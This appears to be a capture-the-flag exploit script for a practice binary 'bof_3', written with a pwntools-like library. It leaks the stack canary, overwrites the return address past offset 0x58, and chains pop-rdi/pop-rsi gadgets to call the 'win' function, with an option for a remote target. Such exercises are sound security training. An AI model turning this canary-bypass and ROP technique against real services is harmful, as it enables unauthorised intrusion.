#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./bof_3', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''


        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    ru(b'is: ')
    cnry = int(rl()[:-1], 16)
    slog('Canary', cnry)

    offset = 0x58
    pop_rdi = 0x0000000000401205
    pop_rsi = 0x000000000040120e

    pl = flat({

        offset : [

            cnry,
            0,
            pop_rdi + 1,
            pop_rdi,
            0xDEADBEEFDEADBEEF,
            pop_rsi,
            0xDEADBEEFDEADBEEF,
            exe.sym['win']

        ]

    })

    sla(b'number: ', pl)


    interactive()

if __name__ == '__main__':
  exploit()
